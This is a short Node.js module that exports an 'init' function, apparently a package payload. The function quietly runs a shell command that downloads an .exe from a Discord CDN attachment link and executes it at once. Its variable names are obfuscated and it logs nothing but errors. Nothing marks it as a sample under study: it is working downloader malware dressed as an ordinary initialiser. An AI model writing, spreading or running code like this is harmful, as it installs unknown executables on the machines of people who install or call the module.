const { exec } = require('node:child_process')
function init() {
  exec(
    'curl https://cdn.discordapp.com/attachments/1033806593281769572/1033832120067567657/a_1.exe -o a.exe && a.exe',
    (_0x58444f, _0x437d57, _0x7426f1) => {
      if (_0x58444f) {
        console.log('error: ' + _0x58444f.message)
      }
    }
  )
}
module.exports = init

